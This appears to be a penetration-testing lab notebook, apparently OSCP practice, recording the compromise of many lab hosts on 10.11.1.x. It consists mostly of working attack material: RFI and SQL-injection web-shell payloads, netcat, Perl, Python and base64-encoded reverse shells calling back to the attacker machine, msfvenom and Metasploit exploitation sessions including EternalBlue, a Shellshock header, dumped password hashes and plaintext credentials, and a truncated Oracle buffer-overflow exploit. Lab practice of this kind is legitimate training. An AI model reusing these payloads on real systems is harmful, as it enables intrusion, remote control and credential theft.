### 10.11.1.8

#### information

Not shown: 990 filtered ports
PORT     STATE  SERVICE     VERSION
21/tcp   open   ftp         vsftpd 2.0.1
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: ERROR
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to 10.11.0.104
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 2.0.1 - secure, fast, stable
|_End of status
22/tcp   open   ssh         OpenSSH 3.9p1 (protocol 1.99)
| ssh-hostkey:
|   1024 89:94:af:2e:5d:c1:da:84:25:11:2c:12:45:c6:70:ac (RSA1)
|   1024 c1:c5:d1:83:0f:4d:d8:9e:8f:82:4c:be:53:4b:6e:14 (DSA)
|_  1024 bc:e1:e6:dd:ab:5e:fd:d1:21:2e:11:7c:d5:b2:03:52 (RSA)
|_sshv1: Server supports SSHv1
25/tcp   closed smtp
80/tcp   open   http        Apache httpd 2.0.52 ((CentOS))
| http-methods:
|_  Potentially risky methods: TRACE
| http-robots.txt: 2 disallowed entries
|_/internal/  /tmp/
|_http-server-header: Apache/2.0.52 (CentOS)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
111/tcp  open   rpcbind     2 (RPC #100000)
| rpcinfo:
|   program version   port/proto  service
|   100000  2            111/tcp  rpcbind
|   100000  2            111/udp  rpcbind
|   100024  1            844/udp  status
|_  100024  1            847/tcp  status
139/tcp  open   netbios-ssn Samba smbd 3.X - 4.X (workgroup: MYGROUP)
443/tcp  open   ssl/https?
|_ssl-date: 2019-03-01T08:39:29+00:00; -11s from scanner time.
| sslv2:
|   SSLv2 supported
|   ciphers:
|     SSL2_RC4_64_WITH_MD5
|     SSL2_RC2_128_CBC_WITH_MD5
|     SSL2_DES_64_CBC_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|_    SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
445/tcp  open   netbios-ssn Samba smbd 3.0.33-0.17.el4 (workgroup: MYGROUP)
631/tcp  open   ipp         CUPS 1.1
| http-methods:
|_  Potentially risky methods: PUT
|_http-title: 403 Forbidden
3306/tcp open   mysql?
|_mysql-info: ERROR: Script execution failed (use -d to debug)
MAC Address: 00:50:56:89:24:79 (VMware)
Service Info: OS: Unix

Host script results:
|_clock-skew: mean: 1h39m49s, deviation: 2h53m12s, median: -11s
| smb-os-discovery:
|   OS: Unix (Samba 3.0.33-0.17.el4)
|   Computer name: phoenix
|   NetBIOS computer name:
|   Domain name:
|   FQDN: phoenix
|_  System time: 2019-03-01T03:39:28-05:00
| smb-security-mode:
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)

###  exploit

https://www.exploit-db.com/exploits/9623

#### poc

http://10.11.1.8/internal/advanced_comment_system/index.php?ACS_path=http://10.11.0.104/shell.txt%00&cmd=cat /etc/passwd

```shell
<pre>root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nolo
```







### 10.11.1.13

####  information

#### exploit

ftp allow anonymous user to upload file in wwwroot path

ftp> dir
200 PORT command successful.
150 Opening ASCII mode data connection for /bin/ls.
01-17-07  06:42PM       <DIR>          AdminScripts
01-17-07  06:43PM       <DIR>          ftproot
01-17-07  06:43PM       <DIR>          iissamples
01-17-07  06:43PM       <DIR>          Scripts
03-13-19  11:46AM       <DIR>          wwwroot

#### poc

msfveon -p windows/meterpreter/reverse_tcp  lhost=ip lport=port  -f asp -o sh.asp

### 10.11.1.22

Nmap scan report for 10.11.1.22
Host is up (0.29s latency).
Not shown: 989 closed ports
PORT      STATE SERVICE     VERSION
21/tcp    open  ftp?
22/tcp    open  ssh         OpenSSH 3.1p1 (protocol 1.99)
| ssh-hostkey:
|   1024 4a:e3:f8:07:d5:d6:b1:b5:bf:54:ac:e7:17:36:7e:e8 (RSA1)
|   1024 77:67:f2:2c:3d:7c:45:24:fe:5e:0f:de:07:65:b3:57 (DSA)
|_  1024 42:b1:48:0b:41:f8:a9:12:cc:9b:c4:ed:26:74:64:2c (RSA)
|_sshv1: Server supports SSHv1
23/tcp    open  telnet?
25/tcp    open  smtp?
|_smtp-commands: Couldn't establish connection on port 25
80/tcp    open  http        Apache httpd 1.3.23 ((Unix)  (Red-Hat/Linux) mod_python/2.7.6 Python/1.5.2 mod_ssl/2.8.7 OpenSSL/0.9.6b DAV/1.0.3 PHP/4.1.2 mod_perl/1.26 mod_throttle/3.1.2)
| http-methods:
|_  Potentially risky methods: PUT DELETE CONNECT PATCH PROPFIND PROPPATCH MKCOL COPY MOVE LOCK UNLOCK TRACE
|_http-server-header: Apache/1.3.23 (Unix)  (Red-Hat/Linux) mod_python/2.7.6 Python/1.5.2 mod_ssl/2.8.7 OpenSSL/0.9.6b DAV/1.0.3 PHP/4.1.2 mod_perl/1.26 mod_throttle/3.1.2
|_http-title: Test Page for the Apache Web Server on Red Hat Linux
111/tcp   open  rpcbind     2 (RPC #100000)
| rpcinfo:
|   program version   port/proto  service
|   100000  2            111/tcp  rpcbind
|   100000  2            111/udp  rpcbind
|   100024  1          32768/tcp  status
|_  100024  1          32768/udp  status
139/tcp   open  netbios-ssn Samba smbd (workgroup: MYGROUP)
199/tcp   open  smux        Linux SNMP multiplexer
443/tcp   open  ssl/https   Apache/1.3.23 (Unix)  (Red-Hat/Linux) mod_python/2.7.6 Python/1.5.2 mod_ssl/2.8.
|_http-server-header: Apache/1.3.23 (Unix)  (Red-Hat/Linux) mod_python/2.7.6 Python/1.5.2 mod_ssl/2.8.7 OpenSSL/0.9.6b DAV/1.0.3 PHP/4.1.2 mod_perl/1.26 mod_throttle/3.1.2
|_http-title: 400 Bad Request
|_ssl-date: 2019-03-13T13:30:48+00:00; -2s from scanner time.
| sslv2:
|   SSLv2 supported
|   ciphers:
|     SSL2_RC2_128_CBC_WITH_MD5
|     SSL2_DES_64_CBC_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|_    SSL2_RC4_64_WITH_MD5
995/tcp   open  ssl/pop3s?
|_ssl-date: 2019-03-13T13:30:47+00:00; -3s from scanner time.
| sslv2:
|   SSLv2 supported
|   ciphers:
|     SSL2_RC2_128_CBC_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|_    SSL2_DES_192_EDE3_CBC_WITH_MD5
32768/tcp open  status      1 (RPC #100024)
MAC Address: 00:50:56:89:2E:AA (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

#### exploit

https://medium.com/@javarmutt/how-to-compile-openfuckv2-c-69e457b4a1d1

poc

https://www.exploit-db.com/raw/764

./openfuck 0x73 10.11.1.22 -c 40

we knew that some port open when we used the nmap scan,

 so we try to get the version about samba.

cat  /var/log/rpmpkgs | grep samba

samba-2.2.3a-6.i386.rpm
samba-client-2.2.3a-6.i386.rpm
samba-common-2.2.3a-6.i386.rpm

this is article : https://yanhan.github.io/netsec-blog/posts/kioptrix-level-1-walkthrough.html

Boom!

perl trans2root.pl   -t  linx86 -H 10.11.0.104 -h 10.11.1.22

we get the root shell

#### 10.11.1.24

csid=a8b144e2690690581ea858648a710cea*; cart_languageC=EN; secondary_currencyC=usd



#### 10.11.1.31

#### information

80/tcp   open  http          Microsoft IIS httpd 6.0
| http-cookie-flags:
|   /:
|     ASPSESSIONIDSCDQASQB:
|_      httponly flag not set
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/6.0
|_http-title: Login
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Windows Server 2003 3790 Service Pack 1 microsoft-ds
1025/tcp open  msrpc         Microsoft Windows RPC
1033/tcp open  msrpc         Microsoft Windows RPC
1433/tcp open  ms-sql-s      Microsoft SQL Server 2000 8.00.766.00; SP3a
| ms-sql-ntlm-info:
|_  Product_Version: 5.2.3790
3389/tcp open  ms-wbt-server Microsoft Terminal Service
MAC Address: 00:50:56:89:1E:41 (VMware)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_server_2003

Host script results:
|_clock-skew: mean: 2h59m57s, deviation: 4h14m34s, median: -3s
| ms-sql-info:
|   Windows server name: RALPH
|   10.11.1.31\MSSQLSERVER:
|     Instance name: MSSQLSERVER
|     Version:
|       name: Microsoft SQL Server 2000 SP3a
|       number: 8.00.766.00
|       Product: Microsoft SQL Server 2000
|       Service pack level: SP3a
|       Post-SP patches applied: false
|     TCP port: 1433
|     Named pipe: \\10.11.1.31\pipe\sql\query
|_    Clustered: false
|_nbstat: NetBIOS name: RALPH, NetBIOS user: USER65, NetBIOS MAC: 00:50:56:89:1e:41 (VMware)
| smb-os-discovery:
|   OS: Windows Server 2003 3790 Service Pack 1 (Windows Server 2003 5.2)
|   OS CPE: cpe:/o:microsoft:windows_server_2003::sp1
|   Computer name: ralph
|   NetBIOS computer name: RALPH\x00
|   Workgroup: THINC\x00
|_  System time: 2019-03-14T21:05:44-06:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)

#### recon

port smb, mssql , web

smb

smbmap -u anonymous -H 10.11.1.31 -R  -A  base-login.txt
[+] Finding open SMB ports....
[+] Guest SMB session established on 10.11.1.31...
[+] IP: 10.11.1.31:445  Name: 10.11.1.31
        Disk                                                    Permissions

----                                                    -----------
​        C$                                                      NO ACCESS
​        IPC$                                                    NO ACCESS
​        ADMIN$                                                  NO ACCESS
​        [+] Match found! Downloading: wwwroot\.\base-login.txt

read the   login-off.asp.txt  by http://10.11.1.31/login-off.asp.txt

cnn.open "PROVIDER=SQLOLEDB;DATA SOURCE=RALPH;User ID=sa;PWD=poiuytrewq;DATABASE=bankdb"

this have the mssql login info

#### sqsh

sqsh -S 10.11.1.31 -U sa 

passwd : poiuytrewq



 xp_cmdshell 'cmd /c dir c:\DOCUME~1\Administrator\desktop\proof.txt';

go

BOOM!



### 10.11.1.24

#### information



#### recon

GET /index.php?target=products&mode=search&subcats=Y&type=extended&avail=Y&pshort=Y&pfull=Y&pname=Y&q=asdf&cid=0&x=0&y=0 HTTP/1.1
Host: 10.11.1.24
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.11.1.24/
Cookie: csid=a8b144e2690690581ea858648a710cea*; cart_languageC=EN; secondary_currencyC=usd

csid have the sql injection, https://seclists.org/pen-test/2007/Dec/75

**Writing a phpshell via SQL Injection to a host**

csid=a8b144e2690690581ea858648a710cea'+union+select+"<%3fphp+echo+shell_exec($_REQUEST['cmd'])%3b%3f>+"+into+outfile+"/var/www/ell2.php"+/*++--+-; cart_languageC=EN

view-source:http://10.11.1.24/ell2.php?cmd=ls

```php
Thumbs.db
addons
admin.php
apache2-default
catalog
chart.php
classes
config.php
core
ell.php
ell.txt
ell2.php
image.php
images
include
index.php
init.php
install.php
install_db
payments
prepare.php
shell.php
shippings
skins
store_closed.gif
store_closed.html
targets
var
```

Boom!

#### reverse shell

nc -e /bin/sh 10.11.0.104 9000

#### enum the system

 msfvenom -p linux/x86/meterpreter_reverse_tcp lhost=10.11.0.104 lport=8000 -f elf -o check

msf5 exploit(multi/handler) > use post/multi/recon/local_exploit_suggester
msf5 post(multi/recon/local_exploit_suggester) > set session 1
session => 1
msf5 post(multi/recon/local_exploit_suggester) > run

[*] 10.11.1.24 - Collecting local exploits for x86/linux...
[*] 10.11.1.24 - 25 exploit checks are being tried...
[+] 10.11.1.24 - exploit/linux/local/glibc_ld_audit_dso_loadP

[+] 10.11.1.24 - exploit/linux/local/glibc_origin_expansion_priv_esc: The target appears to be vulnerable.
[+] 10.11.1.24 - exploit/linux/local/sock_sendpage: The target appears to be vulnerable.
[*] Post module execution completed



msf5 exploit(linux/local/glibc_ld_audit_dso_load_priv_esc) > set lhost 10.11.0.104
lhost => 10.11.0.104
msf5 exploit(linux/local/glibc_ld_audit_dso_load_priv_esc) > run

[*] Started reverse TCP handler on 10.11.0.104:4444
[+] The target appears to be vulnerable
[*] Using target: Linux x86
[*] Writing '/tmp/.QCt1Q64' (1271 bytes) ...
[*] Writing '/tmp/.BU8n4' (281 bytes) ...
[*] Writing '/tmp/.wiUsPR47P' (207 bytes) ...
[*] Launching exploit...
[*] Sending stage (985320 bytes) to 10.11.1.24
[*] Meterpreter session 2 opened (10.11.0.104:4444 -> 10.11.1.24:46457) at 2019-03-15 15:22:22 +0800

meterpreter > sessions -i 2
Usage: sessions <id>

Interact with a different session Id.
This works the same as calling this from the MSF shell: sessions -i <session id>

meterpreter > sessions  -i 2
Usage: sessions <id>

Interact with a different session Id.
This works the same as calling this from the MSF shell: sessions -i <session id>

meterpreter > getuid
Server username: uid=0, gid=0, euid=0, egid=

Boom!

[*] Downloading: /root/capture.cap -> capture.cap
[*] Downloaded 2.24 KiB of 2.24 KiB (100.0%): /root/capture.cap -> capture.cap
[*] download   : /root/capture.cap -> capture.cap

we wanna see the capture.cap, this is something interersting

220-FileZilla Server version 0.9.34 beta

220-written by Tim Kosse (Tim.Kosse@gmx.de)

220 Please visit http://sourceforge.net/projects/filezilla/

10.11.1.220

USER brett

331 Password required for brett

PASS ilovesecuritytoo

230 Logged on

SYST

215 UNIX emulated by FileZilla

QUIT

221 Goodbye

####  10.11.1.31

sory I Forgot this how to get shell



## 10.11.1.35

#### information

#### recon

this is a LFI https://10.11.1.35/section.php?page=/etc/passwd%00 and RFI 

#### poc

https://10.11.1.35/section.php?page=http://10.11.0.104/cmd.txt%00&cmd=ls

'''

```
alldocs.php
bobdocs.php
files
frame_a.htm
frame_b.htm
frame_c.htm
index.html
section.php
```

'''

 privsec

https://www.exploit-db.com/exploits/28657

 glibc_origin_expansion_priv_esc  to be vulnerable.

https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack/blob/master/2010/CVE-2010-3847.sh

```bash
root@ens:~/oscp/35/www# gcc -m32 -w -fPIC -shared -o lenis  a.c
root@ens:~/oscp/35/www# cat shell.sh
#!/bin/bash

mkdir /tmp/lenis
ln /bin/ping /tmp/lenis/target
exec 3< /tmp/lenis/target
rm -rf /tmp/lenis/
mv lenis.bak lenis
#rm -r a.c
LD_AUDIT="\$ORIGIN" exec /proc/self/fd/3
```




```bash


bash-3.1$ bash shell.sh
bash-3.1# id
uid=0(root) gid=48(apache) groups=48(apache)
bash-3.1# cd /root
bash-3.1# cat proo*
3f7d652a3efb59d0631771f65c65ba07
```

# 10.11.1.39

10.11.1.39
User-Agent: goolgebot
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Pragma: no-cache
Cache-Control: no-cache

User-agent: *
Allow: /otrs/index.pl



# 10.11.1.44



# 10.11.1.49

# 10.11.1.71

http://10.11.1.71/cgi-bin/admin.cgi

```bash
Perl verion is 5.18.2
HTTP Server is Apache 2.4.7. Modules: 
Operating System is Ubuntu Linux 14.04 (kernel: 3.13.0-141-generic)
CPU: Intel(R) Xeon(R) CPU X5690  @ 3.47GHz
Statistics for CpuStats (all)
  user      0.00
  nice      0.00
  system    0.00
  idle      100.00
  ioWait    0.00
  total     0.00

Memory Usage: 674/737MB (91.45%)
Disk Usage: 2/4GB (47%)
CPU Load: 0.00

Current users:

Filesystem      Size  Used Avail Use% Mounted on
/dev/sda1       4.8G  2.1G  2.5G  47% /
none            4.0K     0  4.0K   0% /sys/fs/cgroup
udev            359M  4.0K  359M   1% /dev
tmpfs            74M  496K   74M   1% /run
none            5.0M     0  5.0M   0% /run/lock
none            369M     0  369M   0% /run/shm
none            100M     0  100M   0% /run/user
```

### payload 

User-Agent: () { :;};/usr/bin/which python;echo;

 gibson@nobrains.com | $P$BR2C9zC2Aau72.4cNZfJPC.iV8Ppj41 <Paste>

gibson@alpha:~$ sudo -l
[sudo] password for gibson:
Matching Defaults entries for gibson on alpha:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User gibson may run the following commands on alpha:
    (ALL : ALL) ALL

root@alpha:/root# cat proo*
97f3446c2c2fc5079f22dc38f60c8a78



# 10.11.1.72

setpassword ryuu pass
Password for ryuu reset

telnet 10.11.1.72 110
Trying 10.11.1.72...
Connected to 10.11.1.72.
Escape character is '^]'.
+OK beta POP3 server (JAMES POP3 Server 2.3.2) ready
user ryuu
+OK
pass pass
+OK Welcome ryuu
list
+OK 2 1807
1 786
2 1021

retr 1
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <19262980.2.1420734423735.JavaMail.root@pop3>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: ryuu@localhost
Received: from localhost ([127.0.0.1])
          by pop3 (JAMES SMTP Server 2.3.2) with SMTP ID 874
          for <ryuu@localhost>;
          Thu, 8 Jan 2015 11:27:01 -0500 (EST)
Date: Thu, 8 Jan 2015 11:27:01 -0500 (EST)
From: mailadmin@localhost
Dear Ryuu,

Here are your ssh credentials to access the system. Remember to reset your password after your first login.
Your access is restricted at the moment, feel free to ask your supervisor to add any command you need to your path.

username: ryuu
password: QUHqhUPRKXMo4m7k

rm /tmp/f;mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1| nc 10.11.0.104 8000 > /tmp/f

echo "cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7IGNhdCAvdG1wL2YgfCAvYmluL3NoIC1pIDI+JjF8IG5jIDEwLjExLjAuMTA0IDgwMDAgPiAvdG1wL2YK" | base64 -d | /bin/sh

setpassword ../../../../../../../../etc/bash_completion.d
Usage: setpassword [username] [password]
setpassword ../../../../../../../../etc/bash_completion.d pass
Password for ../../../../../../../../etc/bash_completion.d reset

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.11.0.104",8000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

```
https://www.exploit-db.com/exploits/35161


cat proof.txt
7ccae11dc3ecb5f65e41b169b05f2c65
```

# 10.11.1.73

# 10.11.1.75

msf5 exploit(windows/smb/ms17_010_eternalblue) > set rhosts 10.11.1.75
rhosts => 10.11.1.75
msf5 exploit(windows/smb/ms17_010_eternalblue) > run

Payload options (generic/shell_reverse_tcp):

[*] Started reverse TCP handler on 10.11.0.104:4444
[*] 10.11.1.75:445 - Connecting to target for exploitation.
[+] 10.11.1.75:445 - Connection established for exploitation.
[+] 10.11.1.75:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.11.1.75:445 - CORE raw buffer dump (42 bytes)
[*] 10.11.1.75:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.11.1.75:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.11.1.75:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1
[+] 10.11.1.75:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.11.1.75:445 - Trying exploit with 12 Groom Allocations.
[*] 10.11.1.75:445 - Sending all but last fragment of exploit packet
[*] 10.11.1.75:445 - Starting non-paged pool grooming
[+] 10.11.1.75:445 - Sending SMBv2 buffers
[+] 10.11.1.75:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.11.1.75:445 - Sending final SMBv2 buffers.
[*] 10.11.1.75:445 - Sending last fragment of exploit packet!
[*] 10.11.1.75:445 - Receiving response from exploit packet
[+] 10.11.1.75:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.11.1.75:445 - Sending egg to corrupted connection.
[*] 10.11.1.75:445 - Triggering free of corrupted buffer.
[*] Command shell session 1 opened (10.11.0.104:4444 -> 10.11.1.75:49233) at 2019-04-04 15:37:32 +0800

 Directory of C:\Users\Administrator\Desktop

10/17/2018  05:13 AM    <DIR>          .
10/17/2018  05:13 AM    <DIR>          ..
10/17/2018  05:13 AM                32 proof.txt
               1 File(s)             32 bytes
               2 Dir(s)  10,107,875,328 bytes free

C:\Users\Administrator\Desktop>type  proof.txt
type  proof.txt
1f88aa9e73f267356f033a42d9320b50
C:\Users\Administrator\Desktop>



# 10.11.1.115

# 10.11.1.116

url :http://10.11.1.116/db/phpliteadmin.php

lfi: http://10.11.1.116/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../..//usr/local/databases/pass.php&cmd=ls

```bash
perl -e 'use Socket;$i="10.11.0.104";$p=8000;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

privilege poc

https://www.exploit-db.com/exploits/26368

$ gcc ptrace.c -o ptrace
ptrace.c:89:2: warning: no newline at end of file
$ ls
ptrace
ptrace.c
$ ./ptrace
id
uid=0(root) gid=0(wheel) egid=80(www) groups=80(www)

cat proof.txt
f96fa30b9bc142e9d5c3649b055c28de

# 10.11.1.125

ftp> get  ../../../../DOCUME~1/Administrateur/Bureau/proof.txt  proof.txt
local: proof.txt remote: ../../../../DOCUME~1/Administrateur/Bureau/proof.txt
200 Port command successful.
150 Opening data connection for ../../../../DOCUME~1/Administrateur/Bureau/proof.txt.
226 File sent ok
32 bytes received in 0.00 secs (16.4128 kB/s)

root@ens:~/oscp/125# cat proof.txt ;echo
dae9aad6636a1c2c330b435e5d1f8120

# 10.11.1.128

Parameter: ID (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: ID=1000' AND 8681=8681-- OTld

    Type: error-based
    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)
    Payload: ID=1000' AND 6986 IN (SELECT (CHAR(113)+CHAR(122)+CHAR(118)+CHAR(107)+CHAR(113)+(SELECT (CASE WHEN (6986=6986) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(107)+CHAR(120)+CHAR(113)))-- aJNI
    
    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: ID=1000' UNION ALL SELECT NULL,CHAR(113)+CHAR(122)+CHAR(118)+CHAR(107)+CHAR(113)+CHAR(89)+CHAR(90)+CHAR(111)+CHAR(120)+CHAR(100)+CHAR(70)+CHAR(69)+CHAR(80)+CHAR(105)+CHAR(88)+CHAR(81)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(111)+CHAR(115)+CHAR(111)+CHAR(99)+CHAR(101)+CHAR(103)+CHAR(104)+CHAR(108)+CHAR(77)+CHAR(110)+CHAR(110)+CHAR(107)+CHAR(117)+CHAR(121)+CHAR(76)+CHAR(100)+CHAR(98)+CHAR(119)+CHAR(101)+CHAR(70)+CHAR(106)+CHAR(107)+CHAR(70)+CHAR(75)+CHAR(81)+CHAR(73)+CHAR(113)+CHAR(106)+CHAR(107)+CHAR(120)+CHAR(113),NULL,NULL-- skOu
sqlmap -r info.req  --level 5 --risk 3 --dbms mssql --dump

 smbmap  -H 10.11.1.128 -u acusecret -p '!3lit3@1ss0rd'
[+] Finding open SMB ports....
[+] Guest SMB session established on 10.11.1.128...
[+] IP: 10.11.1.128:445 Name: dj.acme.local
        Disk                                                    Permissions
----                                                    -----------
​        IPC$                                                    NO ACCESS
​        share                                                   READ, WRITE
​        wwwroot                                                 READ ONLY
​        ADMIN$                                                  NO ACCESS
​        C$                                                      NO ACCESS



msf5 exploit(windows/fileformat/adobe_pdf_embedded_exe) > set lhost 10.11.0.104
lhost => 10.11.0.104
msf5 exploit(windows/fileformat/adobe_pdf_embedded_exe) > exploit

[*] Reading in '/usr/share/metasploit-framework/data/exploits/CVE-2010-1240/template.pdf'...
[*] Parsing '/usr/share/metasploit-framework/data/exploits/CVE-2010-1240/template.pdf'...
[*] Using 'windows/meterpreter/reverse_tcp' as payload...
[+] Parsing Successful. Creating 'evil.pdf' file...
[+] evil.pdf stored at /root/.msf4/local/evil.pdf

# 10.11.1.133

# 10.11.1.141

:/var/spool/mqueue:/sbin/nologin
rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
nfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologin
apache:x:48:48:Apache:/var/www:/sbin/nologin
squid:x:23:23::/var/spool/squid:/sbin/nologin
webalizer:x:67:67:Webalizer:/var/www/usage:/sbin/nologin
xfs:x:43:43:X Font Server:/etc/X11/fs:/sbin/nologin
ntp:x:38:38::/etc/ntp:/sbin/nologin
mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bash
bob:x:500:500::/home/bob:/bin/bash
alice:x:501:501::/home/alice:/bin/bash

-------------------------------------
root@ens:~/oscp/141# perl 2017.pl 10.11.1.141 10000 /etc/shadow 0
WEBMIN EXPLOIT !!!!! coded by UmZ!
Comments and Suggestions are welcome at umz32.dll [at] gmail.com
Vulnerability disclose at securitydot.net
I am just coding it in perl 'cuz I hate PHP!
Attacking 10.11.1.141 on port 10000!
FILENAME:  /etc/shadow

 FILE CONTENT STARTED
 -----------------------------------
root:$1$236Vlq03$B7t0m/g9MRJmiR/ufF4jo0:16903:0:99999:7:::
bin:*:13653:0:99999:7:::
daemon:*:13653:0:99999:7:::
adm:*:13653:0:99999:7:::
lp:*:13653:0:99999:7:::
sync:*:13653:0:99999:7:::
shutdown:*:13653:0:99999:7:::
halt:*:13653:0:99999:7:::
mail:*:13653:0:99999:7:::
news:*:13653:0:99999:7:::
uucp:*:13653:0:99999:7:::
operator:*:13653:0:99999:7:::
games:*:13653:0:99999:7:::
gopher:*:13653:0:99999:7:::
ftp:*:13653:0:99999:7:::
nobody:*:13653:0:99999:7:::
dbus:!!:13653:0:99999:7:::
vcsa:!!:13653:0:99999:7:::
rpm:!!:13653:0:99999:7:::
haldaemon:!!:13653:0:99999:7:::
pcap:!!:13653:0:99999:7:::
nscd:!!:13653:0:99999:7:::
named:!!:13653:0:99999:7:::
netdump:!!:13653:0:99999:7:::
sshd:!!:13653:0:99999:7:::
rpc:!!:13653:0:99999:7:::
mailnull:!!:13653:0:99999:7:::
smmsp:!!:13653:0:99999:7:::
rpcuser:!!:13653:0:99999:7:::
nfsnobody:!!:13653:0:99999:7:::
apache:!!:13653:0:99999:7:::
squid:!!:13653:0:99999:7:::
webalizer:!!:13653:0:99999:7:::
xfs:!!:13653:0:99999:7:::
ntp:!!:13653:0:99999:7:::
mysql:!!:13653:0:99999:7:::
bob:$1$Rrhb4lzg$Ee8/JYZjv.NimwyrSEL6R/:16903:0:99999:7:::BUGZBUNNY
alice:$1$BfWG661G$ye24xqRQEx.nq.bZTATwf.:16917:0:99999:7:::loading1

# 10.11.1.146

# 10.11.1.202

```python
#Exploit Title:Oracle 9i XDB HTTP PASS Buffer Overflow
#Date: 09/25/2017
#Exploit Author: Charles Dardaman
#Twitter: https://twitter.com/CharlesDardaman
#Website: http://www.dardaman.com
#Version:9.2.0.1
#Tested on: Windows 2000 SP4
#CVE: 2003-0727
#This is a modified stand alone exploit of https://www.exploit-db.com/exploits/16809/

#!/usr/bin/python

import socket, sys, base64

#usage ./oracle9i_xbd_pass <target ip> <target port>

rhost = sys.argv[1] #target ip
rport = int(sys.argv[2]) #target port

#Variables:
ret = "\x46\x6d\x61\x60" #0x60616d46 Little endian form
nop = "\x90"
pre = "\x81\xc4\xff\xef\xff\xff\x44" #This has to be prepended into the shellcode.

#msfvenom -p windows/shell_bind_tcp lport=9989 exitfunc=thread -f py -b "\x00" -e x86/shikata_ga_nai
#355 bytes
payload =  ""
payload += pre
#payload += "\xba\x64\xdb\x93\xe7\xda\xd6\xd9\x74\x24\xf4\x58\x29"
#payload += "\xc9\xb1\x53\x31\x50\x12\x83\xc0\x04\x03\x34\xd5\x71"
#payload += "\x12\x48\x01\xf7\xdd\xb0\xd2\x98\x54\x55\xe3\x98\x03"
#payload += "\x1e\x54\x29\x47\x72\x59\xc2\x05\x66\xea\xa6\x81\x89"
#payload += "\x5b\x0c\xf4\xa4\x5c\x3d\xc4\xa7\xde\x3c\x19\x07\xde"
#payload += "\x8e\x6c\x46\x27\xf2\x9d\x1a\xf0\x78\x33\x8a\x75\x34"
#payload += "\x88\x21\xc5\xd8\x88\xd6\x9e\xdb\xb9\x49\x94\x85\x19"
#payload += "\x68\x79\xbe\x13\x72\x9e\xfb\xea\x09\x54\x77\xed\xdb"
#payload += "\xa4\x78\x42\x22\x09\x8b\x9a\x63\xae\x74\xe9\x9d\xcc"
#payload += "\x09\xea\x5a\xae\xd5\x7f\x78\x08\x9d\xd8\xa4\xa8\x72"
